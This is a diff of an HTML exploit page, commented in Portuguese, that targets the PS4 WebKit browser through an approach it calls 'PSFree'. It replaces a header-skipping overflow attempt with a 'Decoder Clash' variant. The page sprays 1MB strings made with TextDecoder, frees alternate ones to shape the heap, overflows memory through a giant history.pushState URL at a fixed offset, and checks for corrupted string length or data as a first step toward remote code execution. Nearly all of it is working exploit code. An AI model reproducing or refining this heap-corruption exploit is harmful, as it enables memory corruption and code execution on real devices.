@@ -1,83 +1,87 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Header Skipper (StructureID Bypass)</title>
+    <title>PSFree Logic: Decoder Clash</title>
     <style>
-        body { background-color: #000; color: #ff0; font-family: monospace; padding: 20px; text-align: center; }
-        button { 
-            font-size: 20px; padding: 20px; width: 100%; border: 2px solid #ff0; background: #222; color: #fff; cursor: pointer; margin-bottom: 10px;
-        }
-        #log { text-align: left; border: 1px solid #555; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; }
+        body { background-color: #000; color: #ff0; font-family: monospace; padding: 20px; }
+        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #ff0; background: #222; color: #fff; cursor: pointer; }
+        #log { border: 1px solid #555; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
+        .win { background-color: #ff0; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; }
     </style>
 </head>
 <body>
 
-    <h1>Header Skipper (Evitando o StructureID)</h1>
-    <p>Tentando corromper o vizinho sem tocar nos seus primeiros bytes vitais.</p>
+    <h1>Técnica Final: Decoder Clash</h1>
+    <p>Alinhando Size Classes usando TextDecoder para Strings de 1MB.</p>
 
-    <button onclick="startSkipAttack(8)">PULAR 8 BYTES (Preserva ID)</button>
-    <button onclick="startSkipAttack(16)">PULAR 16 BYTES (Preserva ID+Flags)</button>
-    <button onclick="startSkipAttack(24)">PULAR 24 BYTES (Preserva Header WebKit)</button>
+    <button onclick="startDecoderAttack()">INICIAR ALINHAMENTO PERFEITO</button>
     
     <div id="log">Pronto. Reinicie o console.</div>
 
     <script>
-        const BASE_OFFSET = 709520; // O início exato do vizinho
+        // O Offset que descobrimos (Header Boundary)
+        const BASE_OFFSET = 709520; 
         const OVERFLOW_AMT = 1024 * 64; 
 
-        // Spray de Strings (Alvo mais provável para alinhamento)
-        // Usamos strings de 128 bytes (pequenas/médias)
-        const TARGET_SIZE = 128; 
-        const SPRAY_COUNT = 5000;
+        // ALINHAMENTO DE CLASSE DE TAMANHO (O Segredo)
+        // O pushState aloca ~1MB. Precisamos de vítimas de ~1MB.
+        // JS Strings têm um header de aprox 24 bytes.
+        const TARGET_SIZE = 1024 * 1024; 
+        const PAYLOAD_SIZE = TARGET_SIZE - 24; 
 
         var victims = [];
 
         function log(msg, type) {
             const el = document.getElementById('log');
-            let color = type === 'win' ? '#0f0' : 'cyan';
-            el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            let cls = type === 'win' ? 'class="win"' : '';
+            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
             el.scrollTop = el.scrollHeight;
         }
 
-        async function startSkipAttack(skipBytes) {
-            log(`--- INICIANDO TESTE: PULAR ${skipBytes} BYTES ---`);
-            
-            // 1. SPRAY DE STRINGS
-            victims = [];
-            // Padding para string de 128 bytes
-            const pad = "B".repeat(TARGET_SIZE - 24); 
+        async function startDecoderAttack() {
+            log(`Criando vítimas de 1MB usando TextDecoder (8-bit force)...`);
 
+            // 1. Preparar o Buffer de origem
+            // Enchemos de 'B' (0x42)
+            let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
+            rawBuffer.fill(0x42);
+            
+            // TextDecoder força a criação de uma string Flat de 8 bits
+            // Isso imita o comportamento de memória do pushState
+            let decoder = new TextDecoder("utf-8");
+            let baseString = decoder.decode(rawBuffer);
+
+            // 2. SPRAY (Encher o Large Heap)
+            // Não precisamos de muitos, pois são gigantes
+            const SPRAY_COUNT = 80; 
+            
             for(let i=0; i<SPRAY_COUNT; i++) {
-                let s = [pad, i].join("").substring(0, TARGET_SIZE - 24);
+                // Adiciona um prefixo único para impedir que o WebKit deduplique as strings
+                // (Se as strings forem iguais, ele aponta todas para a mesma memória)
+                let s = i + "_" + baseString.substring((i+"_").length);
                 victims.push(s);
             }
 
-            // 2. BURACOS
-            for(let i=0; i<SPRAY_COUNT; i+=2) victims[i] = null;
+            // 3. BURACOS (Feng Shui)
+            log("Abrindo buracos no Large Heap...");
+            for(let i=0; i<SPRAY_COUNT; i+=2) {
+                victims[i] = null;
+            }
+
+            // Força GC pesado
             await forceGC();
 
-            // 3. EXPLOIT (COM PULO)
-            log(`Disparando Overflow (Safe-Zone de ${skipBytes} bytes)...`);
-            
+            // 4. EXPLOIT
+            log("Disparando Overflow (Tentando ocupar o buraco)...");
             setTimeout(() => {
                 try {
-                    // Parte 1: Enche até a borda do vizinho (709.520)
                     let buffer = "A".repeat(BASE_OFFSET);
-                    
-                    // Parte 2: A ZONA NEUTRA (Pula o StructureID)
-                    // Escrevemos 0x00 nos primeiros bytes do vizinho.
-                    // Esperamos que 0x00 não cause crash imediato ou seja ignorado.
-                    // \u0000 conta como 1 byte.
-                    buffer += "\u0000".repeat(skipBytes); 
-                    
-                    // Parte 3: A CORRUPÇÃO (0x01)
-                    // Agora sim escrevemos 0x01 para tentar pegar o Length ou Ponteiro de Dados
                     buffer += "\x01".repeat(OVERFLOW_AMT);
+                    
+                    history.pushState({}, "pwn", "/" + buffer);
 
-                    history.pushState({}, "skip_pwn", "/" + buffer);
-
-                    log("Verificando strings...");
-                    checkStrings();
+                    log("Verificando corrupção...");
+                    checkVictims(PAYLOAD_SIZE);
 
                 } catch (e) {
                     log("Erro: " + e.message);
@@ -85,41 +89,44 @@
             }, 500);
         }
 
-        function checkStrings() {
-            let found = false;
+        function checkVictims(expectedLen) {
+            let success = false;
             for(let i=1; i<victims.length; i+=2) {
                 let s = victims[i];
                 if(!s) continue;
 
-                // Tenta detectar corrupção via Error.message (Técnica PSFree)
+                // TRUQUE DO PSFREE: Usar Error para ler
                 try {
                     let err = new Error(s);
-                    let val = err.message;
-                    
-                    // Se o tamanho mudou (porque atingimos o campo length depois do ID)
-                    if (val.length !== s.length) {
-                        log(`!!! SUCESSO !!! String ${i} Length Corrompido!`, 'win');
-                        log(`Novo Tamanho: ${val.length}`, 'win');
+                    let msg = err.message;
+
+                    // Checa Tamanho
+                    if (msg.length !== expectedLen) {
+                        log(`!!! SUCESSO (LENGTH) !!! String ${i}`, 'win');
+                        log(`Novo Tamanho: ${msg.length}`);
                         alert("RCE STEP 1: LENGTH CORRUPTED!");
-                        found = true;
+                        success = true;
                         break;
                     }
-                    
-                    // Se o conteúdo mudou (porque atingimos o ponteiro de dados)
-                    if (val.charCodeAt(0) !== 66) { // 66 = 'B'
-                        log(`!!! SUCESSO !!! String ${i} Ponteiro Corrompido!`, 'win');
-                        alert("RCE STEP 1: POINTER CORRUPTED!");
-                        found = true;
+
+                    // Checa Conteúdo (Byte 0x01)
+                    if (msg.charCodeAt(0) !== 66) { // 66 = 'B'
+                        log(`!!! SUCESSO (CONTENT) !!! String ${i} sobrescrita!`, 'win');
+                        alert("RCE STEP 1: DATA CORRUPTED!");
+                        success = true;
                         break;
                     }
-                } catch(e) {}
+                } catch(e) {
+                    // Se der erro ao ler, pode ser um bom sinal (ponteiro inválido)
+                    log(`Erro ao ler vítima ${i}: ${e.message}`);
+                }
             }
-            if(!found) log("Nenhuma corrupção detectada.");
+            if(!success) log("Nenhuma string atingida. Isolamento persiste.");
         }
 
         async function forceGC() {
             try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
-            return new Promise(r => setTimeout(r, 500));
+            return new Promise(r => setTimeout(r, 800));
         }
     </script>
 </body>
